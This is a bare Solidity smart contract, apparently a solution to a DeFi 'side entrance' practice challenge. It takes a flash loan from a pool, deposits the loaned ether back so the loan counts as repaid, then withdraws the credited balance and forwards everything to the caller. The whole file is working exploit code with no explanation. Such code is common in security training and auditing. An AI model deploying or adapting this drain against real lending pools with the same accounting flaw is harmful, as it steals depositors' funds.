//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract SideEntrant {
    receive() external payable {}

    function enter(address pool, uint256 amount) public {
        pool.call(abi.encodeWithSignature("flashLoan(uint256)", amount));
    }

    function execute() external payable {
        payable(msg.sender).call{value: msg.value}(
            abi.encodeWithSignature("deposit()")
        );
    }

    function withdraw(address pool) public {
        pool.call(abi.encodeWithSignature("withdraw()"));
        payable(msg.sender).call{value: address(this).balance}("");
    }
}
